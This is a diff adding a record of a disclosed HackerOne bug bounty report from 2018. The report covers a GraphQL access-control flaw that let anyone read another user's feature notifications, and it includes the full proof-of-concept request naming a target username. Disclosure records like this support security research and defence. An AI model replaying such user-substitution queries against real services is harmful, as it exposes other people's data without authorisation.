@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/316810
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/firs0v
+ReportedTo:HackerOne(security)
+BountyAmount:250.0
+Severity:medium
+State:Closed
+DateOfDisclosure:12.03.2018 12:49:00
+
+Summary:
+
+**Summary:**
+An attacker can read feature notifications from any user. 
+Just need to change `me` to `user(username:"filedescriptor")` in your request to get the features.
+
+### Steps To Reproduce
+
+`POST /graphql HTTP/1.1
+Host: hackerone.com
+{"query":"query New_feature {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  user(username:\"filedescriptor\") {\n    id, username\n,  reputation,   new_feature_notification {\n      name,\n      description,\n      url,\n      id\n    }\n  },\n  id\n}","variables":{}}`
+
+## Impact
+
+An attacker can read unread features from any user and have to know how long this user did not visit the hackerone (as example). Probably in future you will make individual feature for individual user. 
+So now it's a bug.
